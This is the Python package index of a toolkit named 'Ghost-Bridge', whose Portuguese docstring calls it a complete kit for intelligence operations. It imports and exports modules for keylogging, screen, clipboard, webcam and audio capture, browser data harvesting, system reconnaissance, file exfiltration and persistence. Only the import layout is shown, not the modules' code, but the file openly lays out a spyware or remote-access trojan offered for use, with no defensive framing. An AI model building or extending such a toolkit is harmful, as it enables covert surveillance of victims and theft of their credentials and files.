"""
Ghost-Bridge - Módulos de Coleta
Toolkit completo para operações de inteligência.
"""

from .keylogger import Keylogger
from .screenshot import ScreenCapture
from .clipboard import ClipboardMonitor
from .browser import BrowserHarvester
from .system_info import SystemRecon
from .file_exfil import FileExfiltrator
from .webcam import WebcamCapture
from .audio import AudioRecorder
from .persistence import PersistenceManager

__all__ = [
    'Keylogger',
    'ScreenCapture', 
    'ClipboardMonitor',
    'BrowserHarvester',
    'SystemRecon',
    'FileExfiltrator',
    'WebcamCapture',
    'AudioRecorder',
    'PersistenceManager'
]
